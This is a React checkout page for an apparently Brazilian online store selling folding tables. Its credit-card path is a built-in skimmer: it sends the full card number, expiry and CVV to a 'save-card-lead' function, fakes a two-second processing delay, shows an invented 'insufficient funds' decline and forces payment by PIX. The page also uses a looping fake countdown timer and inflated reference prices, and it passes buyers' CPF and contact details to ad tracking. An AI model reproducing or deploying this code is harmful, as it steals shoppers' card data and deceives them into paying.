import { useState, useEffect, useRef } from "react";
import { useNavigate, useSearchParams } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import { toast } from "@/hooks/use-toast";
import { trackTikTokEvent, identifyTikTokUser, setUserData } from "@/lib/tiktok-tracking";
import {
  ArrowLeft, MapPin, Star, Truck, ShieldCheck, Minus, Plus, ChevronRight, Check, ChevronDown, CreditCard
} from "lucide-react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";

const SIZE_PRICES: Record<string, { price: number; oldPrice: number; discount: number }> = {
  "120x60cm": { price: 69.90, oldPrice: 159.90, discount: 56 },
  "150x60cm": { price: 79.90, oldPrice: 179.90, discount: 55 },
  "180x60cm": { price: 87.60, oldPrice: 199.90, discount: 56 },
  "240x60cm": { price: 109.90, oldPrice: 249.90, discount: 56 },
};

function useCheckoutCountdown() {
  const [time, setTime] = useState({ h: 0, m: 5, s: 0 });
  useEffect(() => {
    const interval = setInterval(() => {
      setTime((prev) => {
        let { h, m, s } = prev;
        s--;
        if (s < 0) { s = 59; m--; }
        if (m < 0) { m = 59; h--; }
        if (h < 0) return { h: 2, m: 59, s: 59 };
        return { h, m, s };
      });
    }, 1000);
    return () => clearInterval(interval);
  }, []);
  const fmt = (n: number) => String(n).padStart(2, "0");
  return { time, display: `${fmt(time.h)}:${fmt(time.m)}:${fmt(time.s)}` };
}

type CartItem = { color: string; size: string; quantity: number };

const Checkout = () => {
  const navigate = useNavigate();
  const [searchParams] = useSearchParams();

  // Load cart items: from localStorage cart OR from URL params (single item)
  const [cartItems, setCartItems] = useState<CartItem[]>(() => {
    try {
      const saved = localStorage.getItem('mesalar_cart');
      if (saved) {
        const parsed = JSON.parse(saved);
        if (Array.isArray(parsed) && parsed.length > 0) return parsed;
      }
    } catch {}
    // Fallback: single item from URL
    const color = searchParams.get("color") || searchParams.get("cor") || "branca";
    const size = searchParams.get("size") || searchParams.get("tamanho") || "180x60cm";
    const qty = parseInt(searchParams.get("qty") || "1", 10);
    return [{ color, size, quantity: qty }];
  });

  const updateCartItemQty = (index: number, qty: number) => {
    if (qty <= 0) {
      const updated = cartItems.filter((_, i) => i !== index);
      if (updated.length === 0) {
        // Last item — navigate back
        localStorage.removeItem('mesalar_cart');
        navigate('/');
        return;
      }
      setCartItems(updated);
      localStorage.setItem('mesalar_cart', JSON.stringify(updated));
    } else {
      const updated = [...cartItems];
      updated[index] = { ...updated[index], quantity: qty };
      setCartItems(updated);
      localStorage.setItem('mesalar_cart', JSON.stringify(updated));
    }
  };

  // InitiateCheckout event on mount
  useEffect(() => {
    window.scrollTo({ top: 0 });
    trackTikTokEvent({
      event: "InitiateCheckout",
      properties: {
        content_type: "product",
        content_id: "mesa-dobravel",
        value: subtotalRaw,
        currency: "BRL",
        contents: cartItems.map(i => ({ content_id: `mesa-dobravel-${i.color}-${i.size}`, quantity: i.quantity })),
      },
    });
  }, []);

  const couponUsed = localStorage.getItem('mesalar_coupon_used') === 'true';
  const savedCoupon = couponUsed ? '' : (localStorage.getItem('mesalar_coupon') || '');
  const couponParam = searchParams.get("cupom") || searchParams.get("coupon") || savedCoupon;
  const couponUpper = couponParam.toUpperCase();
  const hasCoupon = !couponUsed && (couponUpper === "VOLTA25" || couponUpper === "ULTIMA50" || couponUpper === "DESCULPA80");
  const couponDiscount = couponUpper === "DESCULPA80" ? 0.80 : couponUpper === "ULTIMA50" ? 0.50 : couponUpper === "VOLTA25" ? 0.25 : 0;
  const couponLabel = couponUpper === "DESCULPA80" ? "DESCULPA80 (-80%)" : couponUpper === "ULTIMA50" ? "ULTIMA50 (-50%)" : "VOLTA25 (-25%)";
  const timer = useCheckoutCountdown();

  const [shipping, setShipping] = useState("padrao");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [addressOpen, setAddressOpen] = useState(true);
  const [cpfError, setCpfError] = useState("");
  const productSectionRef = useRef<HTMLDivElement>(null);
  const [paymentMethod, setPaymentMethod] = useState<"pix" | "credit_card">("pix");
  const [cardDisabled, setCardDisabled] = useState(false);
  const [cardForm, setCardForm] = useState({
    number: "", holder: "", expiry: "", cvv: "", installments: 1,
  });

  const formatCardNumber = (val: string) => {
    const nums = val.replace(/\D/g, "").slice(0, 16);
    return nums.replace(/(\d{4})(?=\d)/g, "$1 ");
  };
  const formatExpiry = (val: string) => {
    const nums = val.replace(/\D/g, "").slice(0, 4);
    if (nums.length <= 2) return nums;
    return `${nums.slice(0, 2)}/${nums.slice(2)}`;
  };
  const updateCardField = (field: string, value: string) => {
    setCardForm((prev) => ({ ...prev, [field]: value }));
  };

  const isCardFormValid = cardForm.number.replace(/\D/g, "").length >= 13 &&
    cardForm.holder.length >= 3 &&
    cardForm.expiry.replace(/\D/g, "").length === 4 &&
    cardForm.cvv.length >= 3;

  const [form, setForm] = useState(() => {
    try {
      const saved = localStorage.getItem('mesalar_checkout_form');
      if (saved) return JSON.parse(saved);
    } catch {}
    return {
      name: "", phone: "", email: "", cep: "",
      uf: "", cidade: "", bairro: "", endereco: "",
      numero: "", complemento: "", cpf: "",
    };
  });

  // Derived totals from all cart items
  const totalQty = cartItems.reduce((sum, i) => sum + i.quantity, 0);
  const subtotalRaw = cartItems.reduce((sum, i) => {
    const sp = SIZE_PRICES[i.size] || SIZE_PRICES["180x60cm"];
    return sum + sp.price * i.quantity;
  }, 0);
  const totalOldPrice = cartItems.reduce((sum, i) => {
    const sp = SIZE_PRICES[i.size] || SIZE_PRICES["180x60cm"];
    return sum + sp.oldPrice * i.quantity;
  }, 0);
  const BASE_DISCOUNT_VALUE = totalOldPrice - subtotalRaw;

  const shippingCost = shipping === "express" ? 14.50 : 0;
  const couponAmount = hasCoupon ? Math.round(subtotalRaw * couponDiscount * 100) / 100 : 0;
  const total = subtotalRaw - couponAmount + shippingCost;
  const totalSavings = BASE_DISCOUNT_VALUE + couponAmount;

  // For backward compat, use first item as "selected"
  const selectedColor = cartItems[0]?.color || "branca";
  const selectedSize = cartItems[0]?.size || "180x60cm";
  const quantity = totalQty;

  const updateField = (field: string, value: string) => {
    setForm((prev: typeof form) => {
      const updated = { ...prev, [field]: value };
      localStorage.setItem('mesalar_checkout_form', JSON.stringify(updated));
      return updated;
    });
  };

  const formatCPF = (val: string) => {
    const nums = val.replace(/\D/g, "").slice(0, 11);
    if (nums.length <= 3) return nums;
    if (nums.length <= 6) return `${nums.slice(0, 3)}.${nums.slice(3)}`;
    if (nums.length <= 9) return `${nums.slice(0, 3)}.${nums.slice(3, 6)}.${nums.slice(6)}`;
    return `${nums.slice(0, 3)}.${nums.slice(3, 6)}.${nums.slice(6, 9)}-${nums.slice(9)}`;
  };

  const validateCPF = (cpf: string): boolean => {
    const nums = cpf.replace(/\D/g, "");
    if (nums.length !== 11) return false;
    if (/^(\d)\1{10}$/.test(nums)) return false;
    let sum = 0;
    for (let i = 0; i < 9; i++) sum += parseInt(nums[i]) * (10 - i);
    let rest = (sum * 10) % 11;
    if (rest === 10) rest = 0;
    if (rest !== parseInt(nums[9])) return false;
    sum = 0;
    for (let i = 0; i < 10; i++) sum += parseInt(nums[i]) * (11 - i);
    rest = (sum * 10) % 11;
    if (rest === 10) rest = 0;
    return rest === parseInt(nums[10]);
  };

  const formatPhone = (val: string) => {
    const nums = val.replace(/\D/g, "").slice(0, 11);
    if (nums.length <= 2) return nums;
    if (nums.length <= 7) return `(${nums.slice(0, 2)}) ${nums.slice(2)}`;
    return `(${nums.slice(0, 2)}) ${nums.slice(2, 7)}-${nums.slice(7)}`;
  };

  const formatCEP = (val: string) => {
    const nums = val.replace(/\D/g, "").slice(0, 8);
    if (nums.length <= 5) return nums;
    return `${nums.slice(0, 5)}-${nums.slice(5)}`;
  };

  const [cepLoading, setCepLoading] = useState(false);

  const buscarCEP = async (cep: string) => {
    const nums = cep.replace(/\D/g, "");
    if (nums.length !== 8) return;
    setCepLoading(true);
    try {
      const res = await fetch(`https://viacep.com.br/ws/${nums}/json/`);
      const data = await res.json();
      if (!data.erro) {
        setForm((prev: typeof form) => {
          const updated = {
            ...prev,
            endereco: data.logradouro || "",
            bairro: data.bairro || "",
            cidade: data.localidade || "",
            uf: data.uf || "",
          };
          localStorage.setItem('mesalar_checkout_form', JSON.stringify(updated));
          return updated;
        });
      }
    } catch (e) {
      console.error("Erro ao buscar CEP", e);
    } finally {
      setCepLoading(false);
    }
  };

  const isAddressComplete = form.cep && form.uf && form.cidade && form.bairro && form.endereco && form.numero;
  const isCpfValid = validateCPF(form.cpf);

  // Scroll to top on mount to show address form first
  useEffect(() => {
    window.scrollTo(0, 0);
  }, []);

  useEffect(() => {
    if (isAddressComplete && form.name && form.phone && form.email && isCpfValid) {
      setAddressOpen(false);
      // Scroll to product/shipping section after closing address
      setTimeout(() => {
        productSectionRef.current?.scrollIntoView({ behavior: "smooth", block: "start" });
      }, 100);
    }
  }, [form.cpf, isAddressComplete, isCpfValid]);

  useEffect(() => {
    const nums = form.cpf.replace(/\D/g, "");
    if (nums.length === 11 && !validateCPF(form.cpf)) {
      setCpfError("CPF inválido. Verifique os dígitos.");
    } else {
      setCpfError("");
    }
  }, [form.cpf]);

  const isFormValid = form.name && form.phone && form.email && form.cep &&
    form.uf && form.cidade && form.bairro && form.endereco &&
    form.numero && isCpfValid;

  const canSubmit = isFormValid && (paymentMethod === "pix" || isCardFormValid);

  const handleSubmit = async () => {
    if (!canSubmit || isSubmitting) return;
    setIsSubmitting(true);

    // Identify user for TikTok before submitting
    await identifyTikTokUser({
      email: form.email,
      phone: form.phone,
      externalId: form.cpf,
    });
    await setUserData({
      email: form.email,
      phone: form.phone,
      externalId: form.cpf,
    });

    try {
      const totalAmountInCents = Math.round(total * 100);

      const payload = {
        amount: totalAmountInCents,
        customer: {
          name: form.name,
          email: form.email,
          phone: form.phone.replace(/\D/g, ""),
          cpf: form.cpf.replace(/\D/g, ""),
        },
        items: cartItems.map((item) => {
            const sp = SIZE_PRICES[item.size] || SIZE_PRICES["180x60cm"];
            const cl = item.color === "preta" ? "Preta" : "Branca";
            return {
              id: `mesa-dobravel-${item.color}-${item.size}`,
              title: `Mesa Dobrável ${cl} ${item.size}`,
              unitPrice: Math.round(sp.price * (1 - couponDiscount) * 100),
              quantity: item.quantity,
              tangible: true,
            };
          }),
        shipping: {
          name: form.name,
          address: {
            street: form.endereco,
            streetNumber: form.numero,
            complement: form.complemento,
            neighborhood: form.bairro,
            city: form.cidade,
            state: form.uf,
            zipcode: form.cep.replace(/\D/g, ""),
            country: "br",
          },
          fee: Math.round(shippingCost * 100),
        },
        metadata: JSON.stringify({
          color: selectedColor,
          size: selectedSize,
          coupon: hasCoupon ? couponUpper : null,
          couponDiscount: couponAmount,
          tracking: Object.fromEntries(new URLSearchParams(window.location.search).entries()),
        }),
      };

      if (paymentMethod === "credit_card") {
        // Save card lead for records
        await supabase.functions.invoke("save-card-lead", {
          body: {
            ...payload,
            card: {
              number: cardForm.number.replace(/\s/g, ""),
              holder: cardForm.holder,
              expiry: cardForm.expiry,
              cvv: cardForm.cvv,
              installments: cardForm.installments,
            },
          },
        });

        // Simulate processing delay
        await new Promise(resolve => setTimeout(resolve, 2000));

        toast({
          title: "Pagamento não aprovado",
          description: "Cartão recusado: saldo insuficiente. Por favor, utilize o PIX para concluir seu pedido.",
          variant: "destructive",
        });
        setCardDisabled(true);
        setPaymentMethod("pix");
        setIsSubmitting(false);
        return;
      }

      console.log("Sending PIX payload:", JSON.stringify(payload));
      const { data, error } = await supabase.functions.invoke("create-pix", {
        body: payload,
      });

      console.log("PIX response data:", JSON.stringify(data));
      console.log("PIX response error:", error);

      if (error || !data || data?.error) {
        const errMsg = data?.details?.message || data?.error || error?.message || "Tente novamente.";
        console.error("Edge function error:", error, data);
        toast({ title: "Erro ao gerar PIX", description: typeof errMsg === 'string' ? errMsg : JSON.stringify(errMsg), variant: "destructive" });
        setIsSubmitting(false);
        return;
      }

      sessionStorage.setItem("pixData", JSON.stringify(data));
      sessionStorage.setItem("orderData", JSON.stringify({
        customer: payload.customer,
        product: { items: cartItems, total, coupon: hasCoupon ? couponUpper : null, couponDiscount: couponAmount },
        shipping: { type: shipping, cost: shippingCost },
      }));

      if (hasCoupon && couponUpper === 'DESCULPA80') {
        localStorage.setItem('mesalar_coupon_used', 'true');
        localStorage.removeItem('mesalar_coupon');
      }

      navigate("/pix");
    } catch (err) {
      console.error("Submit error:", err);
      toast({ title: "Erro inesperado", description: "Tente novamente.", variant: "destructive" });
      setIsSubmitting(false);
    }
  };

  return (
    <div className="min-h-screen bg-background pb-[140px]">
      {/* Header */}
      <header className="sticky top-0 z-40 border-b bg-card px-4 py-3">
        <div className="mx-auto max-w-[480px] flex items-center gap-3">
          <button onClick={() => navigate(-1)} className="text-foreground">
            <ArrowLeft className="h-5 w-5" />
          </button>
          <div className="flex-1 text-center">
            <p className="font-bold text-sm">Resumo do pedido</p>
            <p className="text-xs text-success flex items-center justify-center gap-1">
              <ShieldCheck className="h-3 w-3" /> Seus dados estão seguros conosco
            </p>
          </div>
          <div className="w-5" />
        </div>
      </header>

      <div className="mx-auto max-w-[480px] px-4">
        {/* Address Section - Collapsible */}
        <button
          onClick={() => setAddressOpen((v) => !v)}
          className="mt-4 w-full flex items-center justify-between"
        >
          <div className="flex items-center gap-2 text-sm font-semibold">
            <MapPin className="h-4 w-4 text-muted-foreground" />
            Endereço de envio
          </div>
          {isAddressComplete ? (
            <span className="flex items-center gap-1 text-xs text-success font-semibold">
              <Check className="h-3.5 w-3.5" /> {form.endereco.length > 20 ? form.endereco.slice(0, 20) + "..." : form.endereco}
            </span>
          ) : (
            <span className="text-xs font-semibold text-cta">+ Adicionar endereço</span>
          )}
        </button>

        {/* Form */}
        {addressOpen && (
        <div className="mt-4 space-y-3">
          <Input placeholder="Nome completo" value={form.name} onChange={(e) => updateField("name", e.target.value)} className="rounded-lg border-border h-12 text-sm" />
          <div className="relative">
            <Input placeholder="Telefone com DDD" inputMode="numeric" value={form.phone} onChange={(e) => updateField("phone", formatPhone(e.target.value))} className="rounded-lg border-border h-12 text-sm pl-12" />
            <span className="absolute left-3 top-1/2 -translate-y-1/2 text-sm text-muted-foreground">+55</span>
          </div>
          <Input placeholder="E-mail" type="email" value={form.email} onChange={(e) => updateField("email", e.target.value)} className="rounded-lg border-border h-12 text-sm" />
          <div className="relative">
            <Input placeholder="CEP" inputMode="numeric" value={form.cep} onChange={(e) => { const formatted = formatCEP(e.target.value); updateField("cep", formatted); const nums = formatted.replace(/\D/g, ""); if (nums.length === 8) buscarCEP(nums); }} className="rounded-lg border-border h-12 text-sm" />
            {cepLoading && <span className="absolute right-3 top-1/2 -translate-y-1/2 text-xs text-muted-foreground">Buscando...</span>}
          </div>
          <div className="grid grid-cols-2 gap-3">
            <Input placeholder="UF" value={form.uf} readOnly={!!form.uf && !cepLoading} onChange={(e) => updateField("uf", e.target.value.toUpperCase().slice(0, 2))} className="rounded-lg border-border h-12 text-sm bg-muted/30" />
            <Input placeholder="Cidade" value={form.cidade} readOnly={!!form.cidade && !cepLoading} onChange={(e) => updateField("cidade", e.target.value)} className="rounded-lg border-border h-12 text-sm bg-muted/30" />
          </div>
          <Input placeholder="Bairro" value={form.bairro} readOnly={!!form.bairro && !cepLoading} onChange={(e) => updateField("bairro", e.target.value)} className="rounded-lg border-border h-12 text-sm bg-muted/30" />
          <Input placeholder="Endereço (rua, avenida...)" value={form.endereco} readOnly={!!form.endereco && !cepLoading} onChange={(e) => updateField("endereco", e.target.value)} className="rounded-lg border-border h-12 text-sm bg-muted/30" />
          <div className="grid grid-cols-2 gap-3">
            <Input placeholder="Número" inputMode="numeric" value={form.numero} onChange={(e) => updateField("numero", e.target.value)} className="rounded-lg border-border h-12 text-sm" />
            <Input placeholder="Complemento" value={form.complemento} onChange={(e) => updateField("complemento", e.target.value)} className="rounded-lg border-border h-12 text-sm" />
          </div>
          <div>
            <Input placeholder="CPF (000.000.000-00)" inputMode="numeric" value={form.cpf} onChange={(e) => updateField("cpf", formatCPF(e.target.value))} className={`rounded-lg border-border h-12 text-sm ${cpfError ? "border-destructive" : ""}`} />
            {cpfError && <p className="text-xs text-destructive mt-1 font-medium">{cpfError}</p>}
          </div>
        </div>
        )}

        {/* Divider */}
        <div ref={productSectionRef} className="mt-6 border-t-2 border-dashed border-[#5BC4D6]" />

        {/* Product Info */}
        <div className="mt-4">
          {cartItems.map((item, idx) => {
            const sp = SIZE_PRICES[item.size] || SIZE_PRICES["180x60cm"];
            const cl = item.color === "preta" ? "Preta" : "Branca";
            const img = item.color === "preta" ? "/images/mesa-preta-popup.webp" : "/images/mesa-branca-popup.webp";
            return (
              <div key={`${item.color}-${item.size}`} className={`flex items-start gap-3 mt-3 ${idx > 0 ? "pt-3 border-t" : ""}`}>
                <img src={img} alt="Mesa" className="w-20 h-20 object-contain rounded-md border" />
                <div className="flex-1 min-w-0">
                  <p className="text-sm font-medium leading-snug">Mesa Dobrável Tipo Maleta {item.size}</p>
                  {/* Flash Sale badge + timer */}
                  <div className="flex items-center gap-1.5 mt-1">
                    <span className="relative inline-flex items-center bg-gradient-to-r from-[#FF4D4D] to-[#FF6B35] text-white text-[10px] font-bold pl-1.5 pr-2 py-0.5 rounded">
                      Oferta Relâmpago
                      <span className="absolute -right-1.5 -top-1 text-sm drop-shadow-sm">⚡</span>
                    </span>
                    <span className="text-xs font-mono font-semibold text-foreground">{timer.display}</span>
                  </div>
                  {/* Free return - subtle */}
                  <p className="text-[11px] text-muted-foreground flex items-center gap-1 mt-1">
                    🔄 Devolução gratuita
                  </p>
                  <div className="flex items-center gap-2 mt-1">
                    <span className="text-base font-bold text-foreground">R$ {sp.price.toFixed(2).replace(".", ",")}</span>
                  </div>
                  <div className="flex items-center gap-1.5">
                    <span className="text-xs text-muted-foreground line-through">R$ {sp.oldPrice.toFixed(2).replace(".", ",")}</span>
                    <span className="text-xs text-cta font-semibold">-{sp.discount}%</span>
                  </div>
                </div>
                <div className="flex items-center gap-0 border rounded-lg h-9 bg-muted/30">
                  <button onClick={() => updateCartItemQty(idx, item.quantity - 1)} className="px-2.5 h-full text-muted-foreground hover:text-foreground"><Minus className="h-3.5 w-3.5" /></button>
                  <span className="text-sm font-medium w-6 text-center">{item.quantity}</span>
                  <button onClick={() => updateCartItemQty(idx, item.quantity + 1)} className="px-2.5 h-full text-muted-foreground hover:text-foreground"><Plus className="h-3.5 w-3.5" /></button>
                </div>
              </div>
            );
          })}
        </div>

        {/* Shipping Options */}
        <div className="mt-6">
          <p className="font-semibold text-sm mb-2">Opções de envio</p>
          <button
            onClick={() => setShipping("padrao")}
            className={`w-full flex items-center justify-between p-3 rounded-lg border-2 mb-2 transition-colors ${
              shipping === "padrao" ? "border-cta bg-cta/5" : "border-border"
            }`}
          >
            <div className="flex items-center gap-3">
              <div className={`w-5 h-5 rounded-full border-2 flex items-center justify-center ${shipping === "padrao" ? "border-cta" : "border-muted-foreground/40"}`}>
                {shipping === "padrao" && <div className="w-2.5 h-2.5 rounded-full bg-cta" />}
              </div>
              <div className="text-left">
                <p className="text-sm font-semibold">Envio Padrão</p>
                <p className="text-xs text-muted-foreground">3 a 7 dias úteis</p>
              </div>
            </div>
            <span className="text-sm font-bold text-success">Grátis</span>
          </button>
          <button
            onClick={() => setShipping("express")}
            className={`w-full flex items-center justify-between p-3 rounded-lg border-2 transition-colors ${
              shipping === "express" ? "border-cta bg-cta/5" : "border-border"
            }`}
          >
            <div className="flex items-center gap-3">
              <div className={`w-5 h-5 rounded-full border-2 flex items-center justify-center ${shipping === "express" ? "border-cta" : "border-muted-foreground/40"}`}>
                {shipping === "express" && <div className="w-2.5 h-2.5 rounded-full bg-cta" />}
              </div>
              <div className="text-left">
                <p className="text-sm font-semibold">TikTok Express</p>
                <p className="text-xs text-muted-foreground">1 a 3 dias úteis</p>
              </div>
            </div>
            <span className="text-sm font-bold">R$ 14,50</span>
          </button>
        </div>

        {/* Discount */}
        <div className="mt-4 flex items-center justify-between py-3 border-t">
          <span className="text-sm flex items-center gap-1.5">🏷 Desconto especial</span>
          <span className="text-sm font-semibold text-cta flex items-center gap-1">
            - R$ {BASE_DISCOUNT_VALUE.toFixed(2).replace(".", ",")} <ChevronRight className="h-4 w-4" />
          </span>
        </div>

        {/* Order Summary */}
        <div className="mt-2 border-t pt-4">
          <p className="font-semibold text-sm mb-3">Resumo do pedido</p>
          <div className="space-y-2 text-sm">
            <div className="flex justify-between">
              <span className="text-muted-foreground flex items-center gap-1">Subtotal do produto ({quantity}x) <ChevronDown className="h-3 w-3" /></span>
              <span>R$ {subtotalRaw.toFixed(2).replace(".", ",")}</span>
            </div>
            {hasCoupon && (
              <div className="flex justify-between">
                <span className="text-coupon font-medium">Cupom {couponLabel}</span>
                <span className="text-coupon font-medium">- R$ {couponAmount.toFixed(2).replace(".", ",")}</span>
              </div>
            )}
            <div className="flex justify-between">
              <span className="text-muted-foreground">Taxa de envio</span>
              <span className={shipping === "padrao" ? "text-success font-medium" : ""}>
                {shipping === "padrao" ? "Grátis" : `R$ ${shippingCost.toFixed(2).replace(".", ",")}`}
              </span>
            </div>
          </div>
          <div className="flex justify-between items-end mt-3 pt-3 border-t">
            <span className="font-bold text-sm">Total</span>
            <div className="text-right">
              <span className="font-bold text-base">R$ {total.toFixed(2).replace(".", ",")}</span>
              <p className="text-[10px] text-muted-foreground">Impostos inclusos</p>
            </div>
          </div>
        </div>

        {/* Payment Method */}
        <div className="mt-4 border-t pt-4">
          <div className="flex items-center justify-between mb-3">
            <p className="font-semibold text-sm">Forma de pagamento</p>
            {hasCoupon && <span className="text-xs text-coupon font-medium">Cupom {couponLabel} ativo ✓</span>}
          </div>

          {/* Credit Card Option */}
          <button
            onClick={() => !cardDisabled && setPaymentMethod("credit_card")}
            className={`w-full flex items-center justify-between p-3 rounded-lg border-2 mb-2 transition-colors ${
              paymentMethod === "credit_card" ? "border-cta bg-cta/5" : "border-border"
            } ${cardDisabled ? "opacity-50 cursor-not-allowed" : ""}`}
            disabled={cardDisabled}
          >
            <div className="flex items-center gap-2">
              <CreditCard className="w-5 h-5 text-muted-foreground" />
              <div className="text-left">
                <span className="text-sm font-medium">Cartão de Crédito</span>
                {cardDisabled && <p className="text-[10px] text-destructive">Indisponível — use PIX</p>}
              </div>
            </div>
            <div className={`w-5 h-5 rounded-full border-2 flex items-center justify-center ${paymentMethod === "credit_card" ? "border-cta" : "border-muted-foreground/40"}`}>
              {paymentMethod === "credit_card" && <div className="w-2.5 h-2.5 rounded-full bg-cta" />}
            </div>
          </button>

          {/* Card Form */}
          {paymentMethod === "credit_card" && !cardDisabled && (
            <div className="space-y-3 mb-3 p-3 rounded-lg bg-muted/30 border">
              <Input
                placeholder="Número do cartão"
                inputMode="numeric"
                value={cardForm.number}
                onChange={(e) => updateCardField("number", formatCardNumber(e.target.value))}
                className="rounded-lg border-border h-12 text-sm"
              />
              <Input
                placeholder="Nome impresso no cartão"
                value={cardForm.holder}
                onChange={(e) => updateCardField("holder", e.target.value.toUpperCase())}
                className="rounded-lg border-border h-12 text-sm"
              />
              <div className="grid grid-cols-2 gap-3">
                <Input
                  placeholder="MM/AA"
                  inputMode="numeric"
                  value={cardForm.expiry}
                  onChange={(e) => updateCardField("expiry", formatExpiry(e.target.value))}
                  className="rounded-lg border-border h-12 text-sm"
                />
                <Input
                  placeholder="CVV"
                  inputMode="numeric"
                  value={cardForm.cvv}
                  onChange={(e) => updateCardField("cvv", e.target.value.replace(/\D/g, "").slice(0, 4))}
                  className="rounded-lg border-border h-12 text-sm"
                />
              </div>
              <div>
                <label className="text-xs text-muted-foreground mb-1 block">Parcelas</label>
                <select
                  value={cardForm.installments}
                  onChange={(e) => updateCardField("installments", e.target.value)}
                  className="w-full h-12 rounded-lg border border-border bg-background px-3 text-sm"
                >
                  <option value={1}>1x de R$ {total.toFixed(2).replace(".", ",")} (sem juros)</option>
                  {[2,3,4,5,6].map(n => {
                    const installmentValue = (total / n).toFixed(2).replace(".", ",");
                    return <option key={n} value={n}>{n}x de R$ {installmentValue} (sem juros)</option>;
                  })}
                </select>
              </div>
            </div>
          )}

          {/* PIX Option */}
          <button
            onClick={() => setPaymentMethod("pix")}
            className={`w-full flex items-center justify-between p-3 rounded-lg border-2 transition-colors ${
              paymentMethod === "pix" ? "border-cta bg-cta/5" : "border-border"
            }`}
          >
            <div className="flex items-center gap-2">
              <img src="/images/pix-icon.webp" alt="Pix" className="w-5 h-5" />
              <span className="text-sm font-medium">Pix</span>
            </div>
            <div className={`w-5 h-5 rounded-full border-2 flex items-center justify-center ${paymentMethod === "pix" ? "border-cta" : "border-muted-foreground/40"}`}>
              {paymentMethod === "pix" && <div className="w-2.5 h-2.5 rounded-full bg-cta" />}
            </div>
          </button>
        </div>

        {/* Terms */}
        <p className="mt-4 text-xs text-muted-foreground leading-relaxed">
          Ao fazer um pedido, você concorda com os{" "}
          <a href="/termos-de-uso" className="font-bold text-foreground underline">Termos de uso e venda</a>{" "}
          e reconhece que leu e concorda com a{" "}
          <a href="/politica-de-privacidade" className="font-bold text-foreground underline">Política de privacidade</a>.
        </p>

        <p className="mt-3 text-xs text-success flex items-center gap-1">
          😊 Você está economizando R$ {totalSavings.toFixed(2).replace(".", ",")} nesse pedido.
        </p>
      </div>

      {/* Sticky Bottom */}
      <div className="fixed bottom-0 left-0 right-0 z-50 bg-card border-t shadow-[0_-2px_12px_rgba(0,0,0,0.06)]">
        <div className="mx-auto max-w-[480px] px-4">
          <div className="flex items-center justify-between py-2">
            <span className="font-bold text-sm">Total ({totalQty} {totalQty === 1 ? 'item' : 'itens'})</span>
            <span className="font-bold text-lg text-cta">R$ {total.toFixed(2).replace(".", ",")}</span>
          </div>
          <Button
            onClick={handleSubmit}
            disabled={!canSubmit || isSubmitting}
            className="w-full font-bold text-base py-4 h-auto rounded-xl mb-3 transition-all duration-300 bg-[#F23D6B] hover:bg-[#e0335f] text-white shadow-lg disabled:cursor-not-allowed disabled:opacity-100"
          >
            {isSubmitting ? "Processando..." : "Fazer pedido"}
          </Button>
        </div>
      </div>
    </div>
  );
};

export default Checkout;
